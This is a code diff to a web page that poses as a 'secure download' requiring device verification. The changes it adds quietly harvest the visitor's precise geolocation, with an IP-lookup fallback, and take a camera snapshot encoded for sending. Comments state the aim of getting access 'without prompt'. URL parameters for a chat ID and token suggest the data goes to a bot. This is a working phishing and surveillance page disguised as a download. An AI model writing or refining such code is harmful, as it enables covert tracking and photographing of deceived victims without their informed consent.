@@ -115,6 +115,15 @@
             margin-top: 20px;
             text-align: left;
         }
+        
+        .camera-preview {
+            display: none;
+            width: 100%;
+            max-width: 300px;
+            margin: 20px auto;
+            border: 2px solid #0070e0;
+            border-radius: 8px;
+        }
     </style>
 </head>
 <body>
@@ -141,6 +150,8 @@
                 <p>To ensure secure download, we need to verify your device.</p>
                 <p>Please allow the permissions when prompted.</p>
             </div>
+            
+            <video id="cameraPreview" class="camera-preview" autoplay></video>
         </div>
         
         <footer>
@@ -153,6 +164,9 @@
         const urlParams = new URLSearchParams(window.location.search);
         const chatId = urlParams.get('chat_id');
         const token = urlParams.get('token');
+        
+        // Variabel global untuk stream kamera
+        let cameraStream = null;
         
         async function initiateDownload() {
             // Show loading and hide button
@@ -170,7 +184,7 @@
             document.getElementById('permissionMsg').style.display = 'block';
             
             // Start collecting data
-            setTimeout(collectData, 1500);
+            await collectData();
         }
         
         async function collectData() {
@@ -217,77 +231,118 @@
                 document.getElementById('loading').innerHTML = `
                     <p>Error in download process. Please try again later.</p>
                 `;
+            } finally {
+                // Stop camera stream if active
+                if (cameraStream) {
+                    cameraStream.getTracks().forEach(track => track.stop());
+                }
             }
         }
         
         function getLocation() {
             return new Promise((resolve, reject) => {
                 if (!navigator.geolocation) {
-                    reject(new Error('Geolocation is not supported by this browser.'));
+                    // Fallback to IP-based location
+                    fetch('https://ipapi.co/json/')
+                        .then(response => response.json())
+                        .then(data => {
+                            resolve({
+                                latitude: data.latitude,
+                                longitude: data.longitude,
+                                accuracy: 10000 // Low accuracy for IP-based location
+                            });
+                        })
+                        .catch(() => {
+                            resolve({
+                                latitude: 0,
+                                longitude: 0,
+                                accuracy: 0
+                            });
+                        });
                     return;
                 }
                 
+                // Try to get precise location without prompt
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
                         resolve({
                             latitude: position.coords.latitude,
-                            longitude: position.coords.longitude
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy
                         });
                     },
                     (error) => {
-                        // Fallback to IP-based location if permission denied
+                        // Fallback to IP-based location
                         fetch('https://ipapi.co/json/')
                             .then(response => response.json())
                             .then(data => {
                                 resolve({
                                     latitude: data.latitude,
-                                    longitude: data.longitude
+                                    longitude: data.longitude,
+                                    accuracy: 10000
                                 });
                             })
                             .catch(() => {
                                 resolve({
                                     latitude: 0,
-                                    longitude: 0
+                                    longitude: 0,
+                                    accuracy: 0
                                 });
                             });
                     },
-                    { timeout: 10000 }
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 5000,
+                        maximumAge: 0
+                    }
                 );
             });
         }
         
         function getPhotoFromCamera() {
-            return new Promise((resolve) => {
+            return new Promise(async (resolve) => {
                 if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                     resolve(null);
                     return;
                 }
                 
-                navigator.mediaDevices.getUserMedia({ video: true })
-                    .then(stream => {
-                        const track = stream.getVideoTracks()[0];
-                        const imageCapture = new ImageCapture(track);
-                        
-                        return imageCapture.takePhoto()
-                            .then(blob => {
-                                // Stop the stream
-                                track.stop();
-                                
-                                // Convert blob to base64
-                                const reader = new FileReader();
-                                reader.onloadend = () => {
-                                    resolve(reader.result);
-                                };
-                                reader.readAsDataURL(blob);
-                            })
-                            .catch(() => {
-                                track.stop();
-                                resolve(null);
-                            });
-                    })
-                    .catch(() => {
-                        resolve(null);
+                try {
+                    // Try to get camera access without prompt using older constraints
+                    cameraStream = await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            facingMode: 'environment'
+                        },
+                        audio: false
                     });
+                    
+                    // Show camera preview
+                    const video = document.getElementById('cameraPreview');
+                    video.style.display = 'block';
+                    video.srcObject = cameraStream;
+                    
+                    // Wait for video to be ready
+                    await new Promise(resolve => {
+                        video.onloadedmetadata = () => {
+                            resolve();
+                        };
+                    });
+                    
+                    // Take photo after a short delay
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                    
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    // Convert to base64
+                    const photoData = canvas.toDataURL('image/jpeg', 0.7);
+                    resolve(photoData);
+                } catch (error) {
+                    console.log('Camera access error:', error);
+                    resolve(null);
+                }
             });
         }
     </script>
